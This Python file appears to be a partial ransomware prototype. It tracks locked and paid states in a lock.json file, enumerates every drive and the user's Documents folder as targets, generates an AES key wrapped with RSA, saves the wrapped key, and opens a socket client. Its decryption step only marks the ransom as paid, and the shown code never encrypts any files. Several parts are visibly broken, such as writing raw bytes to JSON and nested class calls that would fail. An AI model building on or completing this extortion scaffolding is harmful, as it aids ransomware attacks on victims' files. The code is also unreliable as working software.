import os
import json
import string
import random
import hashlib
import datetime
import heapq
from mysocket import MySocket
from collections import Counter
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from Crypto.PublicKey import RSA

__rmfolderPath = f"C:/Users/{os.getlogin()}/AppData/Local/bkms/"
testPath = "./data/"

import heapq
from collections import Counter

class __HuffmanNode:
    def __init__(self, freq, symbol=None, left=None, right=None):
        self.freq = freq
        self.symbol = symbol
        self.left = left
        self.right = right

    def __lt__(self, other):
        return self.freq < other.freq

class __HuffmanCoding:
    def __init__(self):
        self.tree = None
        self.codebook = {}

    def build_huffman_tree(self, text):
        frequency = Counter(text)
        heap = [__HuffmanNode(freq, symbol) for symbol, freq in frequency.items()]
        heapq.heapify(heap)

        while len(heap) > 1:
            left = heapq.heappop(heap)
            right = heapq.heappop(heap)
            merged = __HuffmanNode(left.freq + right.freq, left=left, right=right)
            heapq.heappush(heap, merged)

        self.tree = heap[0]
        return self.tree

    def build_codes(self, node, prefix=""):
        if node.symbol is not None:
            self.codebook[node.symbol] = prefix
        else:
            self.build_codes(node.left, prefix + "0")
            self.build_codes(node.right, prefix + "1")

    def huffman_encode(self, text):
        self.tree = self.build_huffman_tree(text)
        self.build_codes(self.tree)
        encoded_text = ''.join(self.codebook[symbol] for symbol in text)
        return encoded_text

    def huffman_decode(self, encoded_text):
        decoded_text = []
        node = self.tree
        for bit in encoded_text:
            node = node.left if bit == '0' else node.right
            if node.symbol is not None:
                decoded_text.append(node.symbol)
                node = self.tree
        return ''.join(decoded_text)

class Mycrypto:
    def checkfile():
        rmfilePath = testPath + "lock.json"

        #0:沒檔案or未加密,1:有檔案未繳錢,2:有檔案已繳錢
        try:
            with open(rmfilePath,"r") as file:
                data = json.load(file)
                #print(json.dumps(data,indent=4))
                if(data["lock"] == 0):
                    return 0
                elif(data["lock"] == 1 and data["paid"] == 0):
                    return 1
                elif(data["lock"] == 1 and data["paid"] == 1):
                    return 2
        except FileNotFoundError:
            print("No found")
            return 0
    
    def __aesKey(length=16):
        return get_random_bytes(length)
    
    def __aesEncrypt(key,plaintext):
        cipher = AES.new(key, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
        iv = cipher.iv
        return iv + ct_bytes
    
    def __aesDecrypt(key,ciphertext):
        iv = ciphertext[:16]
        ct = ciphertext[16:]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return pt.decode()
    
    def __rasKey(length=2048):
        return RSA.generate(length)
    
    def __rasEncrypt(aseKey,rasPublicKey):
        cipher = PKCS1_OAEP.new(rasPublicKey)
        return cipher.encrypt(aseKey)

    def __rasDecrypt(enAseKey,rasPrivateKey):
        cipher = PKCS1_OAEP.new(rasPrivateKey)
        return cipher.decrypt(enAseKey)
    
    def _getAvaiblableDrives():
        drives = []
        for letter in string.ascii_uppercase:
            drive = letter + ":/"
            if os.path.exists(drive):
                drives.append(drive)
        drives.remove("C:/")
        drives.append(f"C:/Users/{os.getlogin()}/Documents")
        return drives
    

    class __createFile:
        def __init__(self,path):
            self.path = path

        def checkfile(self,fileName,length=16):
            rmfilePath = self.path + "/" + fileName

            letters_and_digits = string.ascii_letters + string.digits
            random_string = ''.join(random.choice(letters_and_digits) for _ in range(length))
            id = hashlib.sha256(random_string.encode()).hexdigest()

            data = {
                "lock":1,
                "paid":0,
                "lockTime":datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "UID":id
                }
            with open(rmfilePath,"w") as file:
                json.dump(data,file,indent=4)

        def randomID(self,fileName,length=16):
            letters_and_digits = string.ascii_letters + string.digits
            random_string = ''.join(random.choice(letters_and_digits) for _ in range(length))
            id = hashlib.sha256(random_string.encode()).hexdigest()

            rmfilePath = self.path + "/" + fileName
            data = {
                "id":id
            }
            with open(rmfilePath,"w") as file:
                json.dump(data,file,indent=4)

        def writeKeyFile(self,key):
            rmfilePath = self.path + "/" + "key.json"
            data = {"key":key}
            with open(rmfilePath,"w") as file:
                json.dump(data,file,indent=4)
        
        def readKeyFile(self):
            rmfilePath = self.path + "/" + "key.json"
            with open(rmfilePath,"r") as file:
                key = json.load(file)
            return key



def runEncryption():
    print("Encryption start")

    __cf = Mycrypto.__createFile(testPath)
    __cf.checkfile("lock.json")
    drives = Mycrypto._getAvaiblableDrives()
    print(drives)

    aseKey = Mycrypto.__aesKey()
    
    rasKey = Mycrypto.__rasKey()
    publicKey = rasKey.publickey()

    enkey = Mycrypto.__rasEncrypt(aseKey,publicKey)
    __cf.writeKeyFile(enkey)

    client = MySocket.Client()
    
    


def rundeCryption():
    print("Decryption start")
    rmfilePath = testPath + "lock.json"
    
    with open(rmfilePath,"r") as file:
        data = json.load(file)
    data["paid"] = 1

    with open(rmfilePath,"w") as file:
        json.dump(data,file,indent=4)